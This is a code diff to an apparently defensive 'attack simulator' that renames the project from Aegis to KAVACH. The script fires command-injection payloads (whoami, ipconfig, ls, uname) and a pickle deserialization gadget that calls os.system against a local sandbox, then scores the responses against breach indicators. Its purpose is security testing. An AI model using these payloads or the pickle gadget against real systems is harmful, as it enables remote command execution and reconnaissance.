@@ -18,7 +18,7 @@ LOG_FILE = Path(__file__).resolve().parents[1] / "data" / "logs" / "attack_resul
 # ── Command injection (/execute) — OS-specific payload sets ──────────────
 
 WINDOWS_PAYLOADS = [
-    ("basic_echo", "echo AEGIS_BREACH_OK"),
+    ("basic_echo", "echo KAVACH_BREACH_OK"),
     ("dir_listing", "dir src"),
     ("whoami", "whoami"),
     ("ipconfig", "ipconfig"),
@@ -29,7 +29,7 @@ WINDOWS_PAYLOADS = [
 ]
 
 LINUX_PAYLOADS = [
-    ("basic_echo", "echo AEGIS_BREACH_OK"),
+    ("basic_echo", "echo KAVACH_BREACH_OK"),
     ("ls_listing", "ls -la src/"),
     ("whoami", "whoami"),
     ("ifconfig", "ifconfig 2>/dev/null || ip a"),
@@ -40,7 +40,7 @@ LINUX_PAYLOADS = [
 ]
 
 IOS_PAYLOADS = [
-    ("basic_echo", "echo AEGIS_BREACH_OK"),
+    ("basic_echo", "echo KAVACH_BREACH_OK"),
     ("uname", "uname -a"),
     ("ios_version", "sw_vers 2>/dev/null || sw_vers -productVersion 2>/dev/null"),
     ("disk_usage", "df -h /private/var"),
@@ -61,7 +61,7 @@ def classify_command_injection(name: str, data: dict) -> bool:
     output = data.get("output", "") or ""
     if not output.strip():
         return False
-    indicators = ["AEGIS_BREACH_OK", "Volume in drive", "Directory of", "uid=", "gid=",
+    indicators = ["KAVACH_BREACH_OK", "Volume in drive", "Directory of", "uid=", "gid=",
                   "Windows IP", "IPv4 Address", "127.0.0.1", "win.ini", "[fonts]",
                   "src\\sandbox_target", "src/sandbox_target", "admin", "user",
                   "Darwin", "kern.version", "ProductVersion", "/private/var", "Mobile"]
@@ -112,7 +112,7 @@ class _EchoMarker:
     on attacker-controlled bytes. Used only against our own sandbox."""
 
     def __reduce__(self):
-        return (os.system, ("echo AEGIS_BREACH_OK",))
+        return (os.system, ("echo KAVACH_BREACH_OK",))
 
 
 def build_session_payloads() -> list[tuple[str, str]]:
@@ -187,7 +187,7 @@ def fire(endpoint: str, param: str, name: str, payload: str, classify) -> None:
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Aegis Attack Simulator")
+    parser = argparse.ArgumentParser(description="KAVACH Attack Simulator")
     parser.add_argument(
         "--target-os", "-os",
         choices=["auto", "windows", "linux", "ios"],
@@ -219,7 +219,7 @@ def main():
     TARGET = f"http://localhost:{args.port}"
     TARGET_LOOPBACK = f"http://127.0.0.1:{args.port}"
 
-    print(f"[*] Aegis Attack Simulator — Target: {TARGET}")
+    print(f"[*] KAVACH Attack Simulator — Target: {TARGET}")
 
     try:
         requests.get(f"{TARGET}/ping", timeout=3)
